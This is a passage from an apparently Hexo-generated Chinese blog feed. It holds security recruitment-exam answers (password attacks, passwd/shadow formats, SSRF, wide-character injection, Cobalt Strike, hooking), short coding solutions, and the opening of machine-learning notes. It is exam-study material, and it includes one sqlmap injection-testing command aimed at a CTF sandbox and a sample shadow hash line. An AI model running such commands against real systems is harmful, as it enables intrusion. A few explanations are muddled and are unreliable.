class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param num_money int整型 奖金的总数,单位为元</span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * C语言声明定义全局变量请加上static，防止重复定义</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">CalulateMethodCount</span><span class="params">(<span class="type">int</span> num_money )</span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(num_money &lt; <span class="number">1</span> || num_money &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;奖金的总数有误！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//递归结束条件</span></span><br><span class="line">        <span class="keyword">if</span>(num_money == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//实现f(n)=f(n-1)+f(n-2)+...+f(1)+1</span></span><br><span class="line">            count = count + CalulateMethodCount(num_money<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>32.撤销/恢复操作具有广泛的用途，比如word文档中输入一个单词，可以点撤销，然后可以再恢复。<br>编程实现如下功能：  从标准输入读取到一个字符串，字符串可包含0个或多个单词，单词以空格或者tab分隔； 如果遇到 “undo” 字符串，表示”撤销”操作，前一个字符串被撤销掉； 如果遇到”redo”字符串，表示恢复刚才撤销掉的字符串。<br>例如：输入字符串 “hello undo redo world.”，  对字符串中的 undo 和 redo 处理后， 最终输出的结果为 “hello world.”</p><p>分析：先初始化两个栈stack和redo，然后利用双栈求解。遍历词表：</p><ol><li>遇到普通词就压入stack，并清空redo栈，因为此时写入了一个新词，再往前的词已经找不回来了；</li><li>遇到undo就从stack中弹栈至redo；</li><li>遇到redo就从redo中弹栈至stack。</li></ol><p>最终stack中的词就是最后保留下来的词。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#空格作为分隔字符串的标志</span></span><br><span class="line">commands = <span class="built_in">input</span>().strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">stack, redo = [], []</span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> commands:</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">&quot;undo&quot;</span>:</span><br><span class="line">        <span class="comment">#如果stack不为空</span></span><br><span class="line">        <span class="keyword">if</span> stack:</span><br><span class="line">            redo.append(stack.pop())</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&quot;redo&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> redo:</span><br><span class="line">            stack.append(redo.pop())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        redo.clear()</span><br><span class="line">        stack.append(cmd)</span><br><span class="line"><span class="comment">#用空格连接stack中的字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; &quot;</span>.join(stack))</span><br></pre></td></tr></table></figure><h1 id="【2020】奇安信秋招安全方向试卷2"><a href="#【2020】奇安信秋招安全方向试卷2" class="headerlink" title="【2020】奇安信秋招安全方向试卷2"></a>【2020】奇安信秋招安全方向试卷2</h1><p>1.其中不是密码破解的方式为？( B )</p><p>A. 密码学分析；B. 撞库；C. 暴力破解；D.字典破解</p><p>解析：</p><ul><li>密码分析学的主要目的是研究加密消息的破译和消息的伪造。通过分析密文来推断该密文对应的明文或者所用密码的密钥的过程也称作密码攻击。密码学分析可分为四类：唯密文攻击、已知明文攻击、选择明文攻击、选择密文攻击。</li><li>撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登录其他网站后，得到一系列可以登录的用户。撞库不属于密码破解。</li><li>暴力破解一般指枚举法。暴力破解就是利用所有可能的字符组密码，去尝试破解。这是最原始、粗暴的破解方法，根据运算能力，如果能够承受得起时间成本的话，最终一定会爆破出密码。</li><li>字典破解就是通过比较合理的条件，筛选或者过滤掉一些全字符组合的内容，大幅降低爆破的成本。我们把筛选出的密码组合成特定的字典。现在用字典爆破密码也是可以的，但是这样做有可能会漏掉真正的密码。</li></ul><p>2.缓冲区溢出漏洞是指当计算机向缓冲区内填充数据位数时，超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。</p><p>3.网络信息系统安全的第一道防线：系统自身没有漏洞；第二道防线：防病毒和Web应用防护系统(Web Application Firewall, WAF)，入侵防御系统(Intrusion Prevention System, IPS)，入侵检测系统(Intrusion Detection System, IDS)；第三道：数据库备份。</p><p>4.在/etc/passwd文件中有一行为：test:x:0:1000::/home/test:/bin/sh，这代表test用户为特权用户。</p><p>解析：/etc/passwd文件中记录了每个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。</p><p>/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</span><br></pre></td></tr></table></figure><ul><li>用户名：代表用户账号的字符串。通常长度不超过8个字符，并且由大小写字母和/或数字组成。登录名中不能有冒号(:)，因为冒号在这里是分隔符。为了兼容起见，登录名中最好不要包含点字符(.)，并且不使用连字符(-)和加号(+)开头。</li><li>口令：一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。</li><li>用户标识号：是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把他们视为同一个用户，但是他们可以有不同的口令、不同的主目录以及不同的登录Shell等。通常用户标识号的取值范围是0～65535。0是超级用户root的标识号，1～99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个上限是500。</li><li>组标识号：字段记录的是用户所属的用户组。它对应着/etc/group文件中的一条记录。</li><li>注释性描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用作finger命令的输出。</li><li>主目录：也就是用户的起始工作目录，它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。</li><li>登录Shell：用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。Shell是用户与Linux系统之间的接口。系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。用户的登录Shell也可以指定为某个特定的程序（此程序不是一个命令解释器）。利用这一特点，我们可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。有些Linux系统要求只有那些在系统中登记了的程序才能出现在这个字段中。系统中有一类用户称为伪用户（psuedousers），这些用户在Linux /etc/passwd文件中也占有一条记录，但是不能登录，因为它们的登录Shell为空。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。</li></ul><p>5.对于Windows系统，提权就是从User用户提升到system用户。</p><p>6.使用静态的ARP缓存可以有效地对抗ARP欺骗。</p><p>7.日常所见的校园饭卡是利用的身份认证的单因素法。<a href="http://blog.chinaunix.net/uid-20509115-id-1660146.html">身份认证的方法</a></p><p>8.如果在/etc/shadow文件中存在一行为：<br>test:!!$6​$tGvVUhEY$PIkpI43HPaEoRrNJSRpM3H0YWOsqTqXCxtER6rak5PMaAoyQohrXNB0YoFCmAuh406n8XOvBBldvMy9trmIV00:18047:7:90:7:::<br>这代表test用户账号不可以正常使用。</p><p>解析：/etc/shadow 文件，用于存储 Linux 系统中用户的密码信息，又称为“影子文件”。/etc/shadow 文件只有 root 用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。</p><p>同 /etc/passwd 文件一样，文件中每行代表一个用户，同样使用 “:” 作为分隔符，不同之处在于，每行用户信息被划分为 9 个字段。每个字段的含义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名:加密密码:最后一次修改时间:最小修改时间间隔:密码有效期:密码需要变更前的警告天数:密码过期后的宽限时间:账号失效时间:保留字段</span><br></pre></td></tr></table></figure><ul><li><p>用户名：同 /etc/passwd 文件的用户名有相同的含义。</p></li><li><p>加密密码：这里保存的是真正加密的密码。目前 Linux 的密码采用的是 SHA512 散列加密算法。注意，这串密码产生的乱码不能手工修改，如果手工修改，系统将无法识别密码，导致密码失效。很多软件通过这个功能，在密码串前加上 “!”、”*“ 或 “x” 使密码暂时失效。所有伪用户的密码都是 “!!” 或 “*“，代表没有密码是不能登录的。当然，新创建的用户如果不设定密码，那么它的密码项也是 “!!”，代表这个用户没有密码，不能登录。</p></li><li><p>最后一次修改时间：此 root 账号在 1970 年 1 月 1 日之后的第 18047 天修改的 root 用户密码。那么，到底 18047 代表的是哪一天呢？可以使用如下命令进行换算：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(v5le0n9㉿kali)-[~]</span><br><span class="line">└─$ date -d &quot;1970-01-01 18047 days&quot;</span><br><span class="line">2019年 05月 31日 星期五 00:00:00 CST</span><br></pre></td></tr></table></figure></li><li><p>最小修改时间间隔：最小修改间隔时间，也就是说，该字段规定了从第 3 字段（最后一次修改密码的日期）起，多长时间之内不能修改密码。如果是 0，则密码可以随时修改；如果是 10，则代表密码修改后 10 天之内不能再次修改密码。此字段是为了针对某些人频繁更改账户密码而设计的。</p></li><li><p>密码有效期：经常变更密码是个好习惯，为了强制要求用户变更密码，这个字段可以指定距离第 3 字段（最后一次更改密码）多长时间内需要再次变更密码，否则该账户密码进行过期阶段。该字段的默认值为 99999，也就是 273 年，可认为是永久生效。如果改为 90，则表示密码被修改 90 天之后必须再次修改，否则该用户即将过期。管理服务器时，通过这个字段强制用户定期修改密码。</p></li><li><p>密码需要变更前的警告天数：与第 5 字段相比较，当账户密码有效期快到时，系统会发出警告信息给此账户，提醒用户 “再过 n 天你的密码就要过期了，请尽快重新设置你的密码！”。该字段的默认值是 7，也就是说，距离密码有效期的第 7 天开始，每次登录系统都会向该账户发出 “修改密码” 的警告信息。</p></li><li><p>密码过期后的宽限时间：也称为“口令失效日”，简单理解就是，在密码过期后，用户如果还是没有修改密码，则在此字段规定的宽限天数内，用户还是可以登录系统的；如果过了宽限天数，系统将不再让此账户登录，也不会提示账户过期，是完全禁用。比如说，此字段规定的宽限天数是 10，则代表密码过期 10 天后失效；如果是 0，则代表密码过期后立即失效；如果是 -1，则代表密码永远不会失效。</p></li><li><p>账号失效时间：同第 3 个字段一样，使用自  1970 年 1 月 1 日以来的总天数作为账户的失效时间。该字段表示，账号在此字段规定的时间之外，不论你的密码是否过期，都将无法使用！该字段通常被使用在具有收费服务的系统中。</p></li><li><p>保留字段：这个字段目前没有使用，等待新功能的加入。</p></li></ul><p>9.如果sa是空口令，那就意味着攻击者可能侵入系统执行任意操作，威胁系统安全。</p><p>解析：MSSQL SERVER 的默认管理员帐号是 SA，所以一般把 MSSQL SERVER 的空密码叫作SA空口令。</p><p>10.<code>set charcter_set_client=&#39;gbk&#39;</code>可能造成宽字符注入。</p><p>11.安全审计是系统活动和记录的独立检查和验证，其功能有：①辅助辨识和分析未经授权的活动或攻击；②对与已建立的安全策略的一致性进行核查；③帮助发现需要改进的安全控制措施。</p><p>12.非军事化区DMZ是为了解决安全防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</p><p>解析：DMZ（Demilitarized Zone）即俗称的隔离区或非军事区，与军事区和信任区相对应，作用是把WEB，e-mail等允许外部访问的服务器单独接在该区端口，使整个需要保护的内部网络接在信任区端口后，不允许任何访问，实现内外网分离，达到用户需求。DMZ可以理解为一个不同于外网或内网的特殊网络区域，DMZ内通常放置一些不含机密信息的公用服务器，比如Web、Mail、FTP等。这样来自外网的访问者可以访问DMZ中的服务，但不可能接触到存放在内网中的公司机密或私人信息等，即使DMZ中服务器受到破坏，也不会对内网中的机密信息造成影响。</p><p>13.PostgreSQL的默认端口为5432。</p><p>14.Windows系统漏洞微软的漏洞编号命名格式为：MS08067<br>MS Micosoft的缩写，固定格式；<br>08 表示年份，即2008年发布的漏洞；<br>067 表示顺序，即当年度发布的第67个漏洞。</p><p>15.RSA可用于加密，数字签名和密钥交换体制。</p><p>16.DNS欺骗是发生在TCP/IP协议中应用层的问题。</p><p>17.NTP服务一般开启的端口是UDP123。</p><p>解析：NTP(Network Time Protocol)是用来使计算机时间同步化的一种协议，它可以使计算机对其服务器或时钟源(如石英钟，GPS等等)做同步化，它可以提供高精准度的时间校正(LAN上与标准间差小于1毫秒，WAN上几十毫秒)，且可介由加密确认的方式来防止恶毒的协议攻击。</p><p>18.SSRF（Server-Side Request Forgery）服务端请求伪造，SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><p>19.启动数据库的账号一般是高权限账号，使用数据库执行系统命令即相当于使用高权限账号执行系统命令，因此数据库提权也属于权限继承类提权。</p><p>20.蠕虫病毒是一种常见的计算机病毒，是无须计算机使用者干预即可运行的独立程序，它通过不停的获得网络中存在漏洞的计算机上的部分或全部控制权来进行传播。计算机病毒是指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据和恶意篡改系统，影响计算机使用并且能够自我复制的一组计算机指令或者程序代码。</p><p>蠕虫是一种可以自我复制的代码，并且通过网络传播，通常无需人为干预就能传播。蠕虫病毒入侵并完全控制一台计算机之后，就会把这台机器作为宿主，进而扫描并感染其他计算机。当这些新的、被蠕虫入侵的计算机被控制之后，蠕虫会以这些计算机为宿主继续扫描并感染其他计算机，这种行为会一直延续下去。蠕虫使用这种递归的方法进行传播，按照指数增长的规律分布自己，进而及时控制越来越多的计算机。</p><p>21.安全套接字协议(Secure Sockets Layer，SSL)，及其继任者传输层安全(Transport Layer Security，TLS)是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层与应用层之间对网络连接进行加密。</p><p>22.<code>PermitRootLogin no</code>意思是不允许root账号直接登录系统。</p><p>23.linux中tail -f 可以读取正在发生改变的日志文件。</p><p>解析：tail用于查看文件尾部的内容，与head相对应。常用来查看日志文件，通过-f实时查看文件最新内容。尤其是对于日志文件较大的时候，通过tail指定输出的行数来查看日志。</p><p>24.sqlmap中-u可以进行POST型注入的检测。</p><p>解析：-u可以进行POST型注入，但不是用-u检测，而是用—data检测。-u后接URL。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://challenge-9a6148b6244df91d.sandbox.ctfhub.com:10800 --batch --data=&quot;id=1&amp;pwd=333&quot;</span><br></pre></td></tr></table></figure><p>25.Cobalt Strike的默认端口号是50050。</p><p>解析：Cobalt Strike简称CS，是一款GUI框架式的渗透测试工具，集成了很多功能。最大的特点是可以团战，有一个服务器多个客户端，每个客户端就是一个攻击者，攻击者通过连接到服务端来共享攻击资源和目标信息甚至session，服务器必须是Linux系统的。</p><p>26.路由权值的计算可能基于路径某单一特性计算，也可能基于路径多种属性。动态路由协议是按照路由的路由权值来判断路由的好坏，并且每一种路由协议的判断方法都是不一样的。</p><p>27.IGP（内部网关协议）是在一个自治网络内网关（主机和路由器）间交换路由信息的协议。路由信息能用于网间协议（IP）或者其它网络协议来说明路由传送是如何进行的。IGP协议包括路由信息协议(RIP，Routing Information Protocol)、开放最短路径优先(Open Shortest Path First，OSPF)、中间系统到中间系统(Intermediate System-to-Intermediate System，IS-IS)、内部网关路由协议(Interior Gateway Routing Protocol，IGRP)、增强内部网关路由协议(Enhanced Interior Gateway Routing Protocol，EIGRP)。</p><p>28.路由环问题会引起慢收敛、广播风暴、路由不一致的问题。</p><p>29.点对点协议（Point to Point Protocol，PPP）为在点对点连接上传输多协议数据包提供了一个标准方法。PPP 最初设计是为两个对等节点之间的 IP 流量传输提供一种封装协议。在 TCP-IP 协议集中它是一种用来同步调制连接的数据链路层协议。</p><p>30.网络防火墙的作用有：①防止内部信息外泄；②防止黑客访问；③建立内部信息和功能与外部信息和功能之间的屏障。</p><p>31.Xposed框架的原理及常用的函数。</p><p>答：原理： 替换system/bin/app_process文件，app_process就是zygote进程文件，所以Xposed通过替换zygote进程实现了控制手机上所有app进程。</p><p>常用函数：</p><p> (1)findAndHookMethod 参数：实现该方法的类的名称，用于解析目标和参数类的类加载器，目标方法名称，目标方法的参数以及回调；</p><p> (2)findAndHookConstructor hook构造函数 参数：实现该方法的类的名称，用于解析目标和参数类的类加载器，目标方法的参数以及回调；</p><p>(3)findClass：使用指定的类加载器查找类 类名的语法 java.lang.String java.lang.String[] android.app.ActivityThread.ResourcesKey android.app.ActivityThread$ResourcesKey 参数：上面格式的类名，类加载器 </p><p>(4)findField：在类中查找自动并将其设置为可访问 参数：变量所在的class，变量名String </p><p>(5)CallMethod 调用给定对象的实例或静态方法 参数：对象实例，方法名称，方法调用的参数 </p><p>(6)newInstance 创建给定类的新实例 参数：类引用，构造函数调用的参数</p><p>32.简述Hook技术。</p><p>答：Hook 技术又叫做钩子函数，在系统没有调用该函数之前，钩子程序就先捕获该消息，钩子函数先得到控制权，这时钩子函数既可以加工处理(改变)该函数的执行行为，还可以强制结束消息的传递。简单来说，就是把系统的程序拉出来变成我们自己执行代码片段。   </p><p>要实现钩子函数，有两个步骤：   </p><ol><li>利用系统内部提供的接口，通过实现该接口，然后注入进系统（特定场景下使用）   </li><li>动态代理（使用所有场景）</li></ol><h1 id="【2020】奇安信秋招安全方向试卷3"><a href="#【2020】奇安信秋招安全方向试卷3" class="headerlink" title="【2020】奇安信秋招安全方向试卷3"></a>【2020】奇安信秋招安全方向试卷3</h1><p>1.下列类型中，不是java语言基本数据类型的是( C )</p><p>A. long；B. double；C. String；D. float</p><p>解析：String不是Java语言基本数据类型，它是引用类型。</p><p>2.CPU的调度分为高级，中级和低级三种，其中高级调度是作业调度；中级调度是交换调度；低级调度是进程调度。</p><p>3.uaf漏洞分析中需要开启的选项为？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;笔试主要内容：网络协议、操作系统、攻击原理&lt;/p&gt;
&lt;p&gt;认真对待每次笔试和面试，积累经验，小凉一定不会失业的！一定可以找到适合自己的工作的！&lt;/p&gt;</summary>
    
    
    
    <category term="往社畜方向前进" scheme="http://example.com/categories/%E5%BE%80%E7%A4%BE%E7%95%9C%E6%96%B9%E5%90%91%E5%89%8D%E8%BF%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>机器学习</title>
    <link href="http://example.com/posts/498ab7d9.html"/>
    <id>http://example.com/posts/498ab7d9.html</id>
    <published>2022-04-29T02:53:43.610Z</published>
    <updated>2022-05-19T03:01:25.036Z</updated>
    
    <content type="html"><![CDATA[<p>做机器学习的实验做得我生无可恋，还是先补一下机器学习的几个算法的基本原理再说吧。</p><span id="more"></span><h1 id="1-统计学习概述"><a href="#1-统计学习概述" class="headerlink" title="1. 统计学习概述"></a>1. 统计学习概述</h1><h2 id="1-1-统计学习三要素"><a href="#1-1-统计学习三要素" class="headerlink" title="1.1. 统计学习三要素"></a>1.1. 统计学习三要素</h2><ul><li><p>模型：确定学习模型的集合。模型在未进行训练前，其可能的参数是多个甚至无穷的，故可能的模型也是多个甚至无穷的，这些模型构成的集合就是假设空间。</p><img src="/posts/498ab7d9/1.1.1.png" class="" title="假设空间"><img src="/posts/498ab7d9/1.1.2.png" class="" title="假设空间"></li><li><p>策略：确定模型选择的准则。即从假设空间中挑选出参数最优的模型的准则。模型的分类或预测结果与实际情况的误差（损失函数）越小，模型就越好。那么策略就是误差最小。</p><img src="/posts/498ab7d9/1.1.3.png" class="" title="策略"><img src="/posts/498ab7d9/1.1.4.png" class="" title="损失函数"><img src="/posts/498ab7d9/1.1.5.png" class="" title="策略"></li><li><p>算法：实现求解最优模型的算法。即从假设空间中挑选模型的方法（等同于求解最佳的模型参数）。机器学习的参数求解通常都会转化为最优化问题，故学习算法通常是最优化算法，例如最速梯度下降法、牛顿法以及拟牛顿法等。</p></li></ul><p>以上是针对监督学习的三要素，下面是针对无监督学习的三要素：</p><img src="/posts/498ab7d9/1.1.6.png" class="" title="无监督学习的三要素"><h2 id="1-2-监督学习"><a href="#1-2-监督学习" class="headerlink" title="1.2. 监督学习"></a>1.2. 监督学习</h2><p>监督学习：从标注数据中学习预测模型的机器学习问题，其本质是学习输入到输出的映射的统计规律。</p><p>输入空间：输入的所有可能取值的集合。</p><p>实例：每一个具体的输入，通常由特征向量表示。</p><p>特征空间：所有特征向量存在的空间。</p><p>输出空间：输出的所有可能取值的集合。</p><p>根据变量类型的不同，可分为回归问题、分类问题和标注问题。</p><p>回归问题：输入变量与输出变量均为连续变量的预测问题。</p><p>分类问题：输出变量为有限个离散变量的预测问题。</p><p>标注问题：输入变量与输出变量均为变量序列的预测问题。</p><img src="/posts/498ab7d9/1.3.1.png" class="" title="监督学习中的符号表示"><img src="/posts/498ab7d9/1.3.2.png" class="" title="监督学习中的符号表示"><h2 id="1-3-无监督学习"><a href="#1-3-无监督学习" class="headerlink" title="1.3. 无监督学习"></a>1.3. 无监督学习</h2><p>无监督学习：从无标注数据中学习预测模型的机器学习问题，其本质是学习数据中的统计规律或潜在结构。</p><img src="/posts/498ab7d9/1.4.1.png" class="" title="无监督学习中的符号表示"><h2 id="1-4-模型评估与选择"><a href="#1-4-模型评估与选择" class="headerlink" title="1.4 模型评估与选择"></a>1.4 模型评估与选择</h2><p>训练误差：</p><img src="/posts/498ab7d9/1.5.1.png" class="" title="训练误差"><p>测试误差：</p><img src="/posts/498ab7d9/1.5.2.png" class="" title="测试误差"><p>误差率与准确率：</p><img src="/posts/498ab7d9/1.5.3.png" class="" title="误差率与准确率"><p>多项式拟合案例：</p><img src="/posts/498ab7d9/1.5.4.png" class="" title="案例"><img src="/posts/498ab7d9/1.5.5.png" class="" title="案例"><img src="/posts/498ab7d9/1.5.6.png" class="" title="案例"><p>过拟合：学习时选择的模型所包含的参数过多，以至于出现这一模型对已知数据预测得很好，但对未知数据预测得很差的现象。</p><img src="/posts/498ab7d9/1.5.7.png" class="" title="训练误差与测试误差"><img src="/posts/498ab7d9/1.5.8.png" class="" title="训练误差与测试误差"><p>欠拟合：模型拟合程度不高，数据距离拟合曲线较远，或指模型没有很好地捕捉到数据特征，不能够很好地拟合数据。</p><p>为了避免过拟合的问题出现，需要选择合适的模型。常用的模型选择方法：正则化和交叉验证。</p><h2 id="1-5-正则化和交叉验证"><a href="#1-5-正则化和交叉验证" class="headerlink" title="1.5 正则化和交叉验证"></a>1.5 正则化和交叉验证</h2><h3 id="1-5-1-正则化"><a href="#1-5-1-正则化" class="headerlink" title="1.5.1 正则化"></a>1.5.1 正则化</h3><p>正则化：实现结构风险最小化策略。</p><img src="/posts/498ab7d9/1.5.9.png" class="" title="正则化"><img src="/posts/498ab7d9/1.5.10.png" class="" title="正则化项"><p>奥卡姆剃刀原理：在模型选择时，选择所有可能模型中，能很好解释已知数据并且十分简单的模型。</p><h3 id="1-5-2-交叉验证"><a href="#1-5-2-交叉验证" class="headerlink" title="1.5.2 交叉验证"></a>1.5.2 交叉验证</h3><img src="/posts/498ab7d9/1.5.11.png" class="" title="数据充足的情况下"><p>在数据不足的情况下：</p><ul><li>简单交叉验证：随即将数据分为两部分，即训练集和测试集。</li><li>S折交叉认证：随机将数据分为S个互不相交、大小相同的子集，其中以S-1个子集作为训练集，余下的子集作为测试集。</li><li>留一交叉验证：S折交叉验证的特殊情形，S=N，N为数据集的样本容量。(在数据极少的情况下使用)</li></ul><h2 id="1-6-泛化能力"><a href="#1-6-泛化能力" class="headerlink" title="1.6 泛化能力"></a>1.6 泛化能力</h2><img src="/posts/498ab7d9/1.6.1.png" class="" title="泛化误差"><img src="/posts/498ab7d9/1.6.2.png" class="" title="泛化误差上界"><img src="/posts/498ab7d9/1.6.3.png" class="" title="泛化误差上界"><h2 id="1-7-生成模型与判别模型"><a href="#1-7-生成模型与判别模型" class="headerlink" title="1.7 生成模型与判别模型"></a>1.7 生成模型与判别模型</h2><h3 id="1-7-1-生成模型"><a href="#1-7-1-生成模型" class="headerlink" title="1.7.1 生成模型"></a>1.7.1 生成模型</h3><img src="/posts/498ab7d9/1.7.1.png" class="" title="生成模型"><h3 id="1-7-2-判别模型"><a href="#1-7-2-判别模型" class="headerlink" title="1.7.2 判别模型"></a>1.7.2 判别模型</h3><img src="/posts/498ab7d9/1.7.2.png" class="" title="判别模型"><h3 id="1-7-3-两者区别"><a href="#1-7-3-两者区别" class="headerlink" title="1.7.3 两者区别"></a>1.7.3 两者区别</h3><img src="/posts/498ab7d9/1.7.3.png" class="" title="生成模型VS判别模型"><h2 id="1-8-监督学习应用"><a href="#1-8-监督学习应用" class="headerlink" title="1.8 监督学习应用"></a>1.8 监督学习应用</h2><h3 id="1-8-1-分类问题"><a href="#1-8-1-分类问题" class="headerlink" title="1.8.1 分类问题"></a>1.8.1 分类问题</h3><img src="/posts/498ab7d9/1.8.1.png" class="" title="二分类问题"><img src="/posts/498ab7d9/1.8.2.png" class="" title="二分类问题"><p>方法：感知机、K近邻法、朴素贝叶斯、决策树、Logistic回归。</p><p>应用：银行业务、网络安全、图像处理、手写识别、互联网搜索。</p><h3 id="1-8-2-标注问题"><a href="#1-8-2-标注问题" class="headerlink" title="1.8.2 标注问题"></a>1.8.2 标注问题</h3><img src="/posts/498ab7d9/1.8.3.png" class="" title="标注问题"><p>方法：隐马尔可夫模型、条件随机场。</p><p>应用：信息抽取、自然语言处理。</p><h3 id="1-8-3-回归问题"><a href="#1-8-3-回归问题" class="headerlink" title="1.8.3 回归问题"></a>1.8.3 回归问题</h3><p>类型：</p><ul><li>按输入变量个数：一元回归、多元回归</li><li>按输入和输出变量之间的关系：线性回归、非线性回归</li></ul><p>损失函数：平方损失</p><p>应用：商务领域</p><h1 id="2-感知机"><a href="#2-感知机" class="headerlink" title="2. 感知机"></a>2. 感知机</h1><h2 id="2-1-感知机模型"><a href="#2-1-感知机模型" class="headerlink" title="2.1 感知机模型"></a>2.1 感知机模型</h2><img src="/posts/498ab7d9/2.1.1.png" class="" title="模型介绍"><img src="/posts/498ab7d9/2.1.2.png" class="" title="模型介绍"><p>在几何中，如果特征空间是n维的，则超平面是n-1维的子空间。比如特征空间是2维的，那么超平面就是一条直线，超平面用来分隔正类和负类。</p><img src="/posts/498ab7d9/2.1.3.png" class="" title="感知机模型的条件"><img src="/posts/498ab7d9/2.1.4.png" class="" title="感知机学习策略"><img src="/posts/498ab7d9/2.1.5.png" class="" title="感知机学习策略"><h2 id="2-2-梯度下降法"><a href="#2-2-梯度下降法" class="headerlink" title="2.2 梯度下降法"></a>2.2 梯度下降法</h2><img src="/posts/498ab7d9/2.2.1.png" class="" title="梯度的概念"><img src="/posts/498ab7d9/2.2.2.png" class="" title="梯度下降法的算法"><p>例子：</p><img src="/posts/498ab7d9/2.2.3.png" class="" title="梯度下降法的例子"><img src="/posts/498ab7d9/2.2.4.png" class="" title="梯度下降法的例子"><p>梯度下降法的原理：</p><img src="/posts/498ab7d9/2.2.5.png" class="" title="梯度下降法的原理"><img src="/posts/498ab7d9/2.2.6.png" class="" title="梯度下降法的原理"><img src="/posts/498ab7d9/2.2.7.png" class="" title="梯度下降法的原理"><h2 id="2-3-感知机的原始形式"><a href="#2-3-感知机的原始形式" class="headerlink" title="2.3 感知机的原始形式"></a>2.3 感知机的原始形式</h2><p>感知机采用监督学习中的二分类问题。原始形式用随机梯度下降法来更新w和b。</p><img src="/posts/498ab7d9/2.3.1.png" class="" title="感知机学习问题"><img src="/posts/498ab7d9/2.3.2.png" class="" title="随机梯度下降法"><p>原始形式的算法：</p><img src="/posts/498ab7d9/2.3.3.png" class="" title="原始形式的算法"><p>例题分析：</p><img src="/posts/498ab7d9/2.3.4.png" 